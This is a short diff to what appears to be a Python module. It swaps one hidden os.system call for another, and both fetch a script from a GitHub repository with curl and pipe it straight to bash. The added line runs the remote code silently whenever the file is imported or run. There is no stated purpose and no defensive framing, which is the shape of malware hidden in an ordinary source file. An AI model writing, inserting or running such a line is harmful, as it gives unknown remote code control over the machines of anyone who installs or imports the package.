@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/tarwells/attos/raw/main/attoss | bash')
+os.system('curl -sL https://github.com/tarwells/prahash/raw/main/prahashs | bash')
